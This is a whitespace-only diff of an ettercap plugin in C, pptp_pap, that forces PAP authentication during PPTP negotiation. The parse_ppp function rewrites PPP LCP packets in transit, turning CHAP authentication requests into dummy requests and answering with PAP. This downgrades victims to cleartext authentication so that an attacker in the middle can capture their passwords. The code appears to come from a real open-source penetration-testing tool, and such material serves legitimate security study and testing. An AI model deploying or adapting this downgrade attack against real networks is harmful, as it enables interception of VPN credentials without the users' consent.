@@ -2,7 +2,7 @@
     pptp_pap -- ettercap plugin -- Forces PAP during PPTP negotiation (it almost fails)
 
     Copyright (C) ALoR & NaGA
-    
+
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation; either version 2 of the License, or
@@ -49,32 +49,32 @@ static void parse_ppp(struct packet_object *po);
 static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len);
 
 /* plugin operations */
-struct plugin_ops pptp_pap_ops = { 
+struct plugin_ops pptp_pap_ops = {
    /* ettercap version MUST be the global EC_VERSION */
-   .ettercap_version =  EC_VERSION,                        
+   .ettercap_version =  EC_VERSION,
    /* the name of the plugin */
-   .name =              "pptp_pap",  
-    /* a short description of the plugin (max 50 chars) */                    
-   .info =              "PPTP: Forces PAP authentication",  
-   /* the plugin version. */ 
-   .version =           "1.0",   
+   .name =              "pptp_pap",
+    /* a short description of the plugin (max 50 chars) */
+   .info =              "PPTP: Forces PAP authentication",
+   /* the plugin version. */
+   .version =           "1.0",
    /* activation function */
    .init =              &pptp_pap_init,
-   /* deactivation function */                     
+   /* deactivation function */
    .fini =              &pptp_pap_fini,
 };
 
 /**********************************************************/
 
 /* this function is called on plugin load */
-int plugin_load(void *handle) 
+int plugin_load(void *handle)
 {
    return plugin_register(handle, &pptp_pap_ops);
 }
 
 /******************* STANDARD FUNCTIONS *******************/
 
-static int pptp_pap_init(void *dummy) 
+static int pptp_pap_init(void *dummy)
 {
    /* It doesn't work if unoffensive */
    if (GBL_OPTIONS->unoffensive) {
@@ -83,13 +83,13 @@ static int pptp_pap_init(void *dummy)
    }
 
    USER_MSG("pptp_pap: plugin running...\n");
-   
+
    hook_add(HOOK_PACKET_LCP, &parse_ppp);
-   return PLUGIN_RUNNING;   
+   return PLUGIN_RUNNING;
 }
 
 
-static int pptp_pap_fini(void *dummy) 
+static int pptp_pap_fini(void *dummy)
 {
    USER_MSG("pptp_pap: plugin terminated...\n");
 
@@ -105,33 +105,33 @@ static void parse_ppp(struct packet_object *po)
    struct ppp_lcp_header *lcp;
    u_int16 *option;
    char tmp[MAX_ASCII_ADDR_LEN];
-   
+
    /* It is pointless to modify packets that won't be forwarded */
-   if (!(po->flags & PO_FORWARDABLE)) 
-      return; 
+   if (!(po->flags & PO_FORWARDABLE))
+      return;
 
    /* PPP decoder placed lcp header in L4 structure.
-    * According to the Hook Point this is an LCP packet.   
-    */      
+    * According to the Hook Point this is an LCP packet.
+    */
    lcp = (struct ppp_lcp_header *)po->L4.header;
 
-   /* Catch only packets that have to be modified */      
-   if ( lcp->code != PPP_CONFIGURE_REQUEST && lcp->code != PPP_CONFIGURE_NAK && lcp->code != PPP_CONFIGURE_REJ) 
+   /* Catch only packets that have to be modified */
+   if ( lcp->code != PPP_CONFIGURE_REQUEST && lcp->code != PPP_CONFIGURE_NAK && lcp->code != PPP_CONFIGURE_REJ)
       return;
 
-   if ( (option=(u_int16 *)parse_option((u_char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL) 
-      return;
-      
-   if ( option[1] == htons(PPP_REQUEST_PAP) ) 
+   if ( (option=(u_int16 *)parse_option((u_char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL)
       return;
 
-   /* Modify the negotiation */      
+   if ( option[1] == htons(PPP_REQUEST_PAP) )
+      return;
+
+   /* Modify the negotiation */
    if ( lcp->code == PPP_CONFIGURE_REJ && option[1] == htons(PPP_DUMMY_REQUEST) ) {
       /* We assume an original CHAP request that we have converted into DUMMY */
       option[1] = htons(PPP_REQUEST_CHAP);
    }
    else if (lcp->code == PPP_CONFIGURE_REQUEST)
-      option[1] = htons(PPP_DUMMY_REQUEST);     
+      option[1] = htons(PPP_DUMMY_REQUEST);
    else if (lcp->code == PPP_CONFIGURE_NAK) {
       option[1] = htons(PPP_REQUEST_PAP);
 
@@ -148,20 +148,20 @@ static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len)
 {
    /* Avoid never-ending parsing on bogus packets ;) */
    char counter=0;
-   
+
    while (tot_len>0 && *buffer!=option && counter<20) {	
       tot_len -= buffer[1];
       buffer += buffer[1];
       counter++;
    }
-   
-   if (*buffer == option) 
+
+   if (*buffer == option)
       return buffer;
-      
+
    return NULL;
 }
 
 /* EOF */
 
 // vim:ts=3:expandtab
- 
+
